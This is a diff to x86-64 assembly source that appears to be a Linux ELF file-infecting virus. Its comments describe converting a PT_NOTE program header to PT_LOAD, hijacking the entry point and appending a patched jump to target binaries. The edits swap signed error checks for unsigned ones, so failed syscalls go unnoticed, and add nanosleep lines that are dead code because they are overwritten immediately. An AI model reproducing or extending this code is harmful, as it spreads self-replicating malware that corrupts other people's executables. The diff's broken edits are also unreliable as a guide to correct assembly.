@@ -84,7 +84,7 @@ _start:
 
 		pop rdi
 		cmp rax, 0
-		jle	_end
+		jbe	_end
 
 		mov rdi, rax
 		lea rsi, [r15 + 400]
@@ -93,7 +93,7 @@ _start:
 		syscall   
 
 		cmp rax, 0
-		jle err
+		jbe err
 
 		mov qword [r15 + 350], rax
 		mov rax, SYS_CLOSE
@@ -114,7 +114,7 @@ _start:
             syscall
 
             cmp rax, 0                                          ; if can't open file, _end now
-            jle .continue
+            jbe .continue
             mov r9, rax  
 		.read_ehdr:
 			mov rdi, r9                                         ; r9 contains fd
@@ -189,9 +189,8 @@ _start:
 				mov rax, SYS_PWRITE64
 				syscall
 
-
 				cmp rax, 0
-				jle .close_file
+				jbe .close_file
 
 		    .patch_phdr:
                 mov dword [r15 + 208], PT_LOAD                  ; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
@@ -214,7 +213,7 @@ _start:
                 syscall
 
                 cmp rax, 0
-                jle .close_file
+                jbe .close_file
 
             .patch_ehdr:
                 mov r14, [r15 + 168]                            ; storing target original ehdr.entry from [r15 + 168] in r14
@@ -229,7 +228,7 @@ _start:
                 syscall
 
                 cmp rax, 0
-                jle .close_file
+                jbe .close_file
 
             .write_patched_jmp:
                 ; getting target new EOF
@@ -288,6 +287,8 @@ cleanup:
     pop rsp
     pop rdx
 _end:
+	mov rax, 35 ; nanosleep
+	mov rdi, 100000
 	xor rdi, rdi
 	mov rax, SYS_EXIT
 	syscall
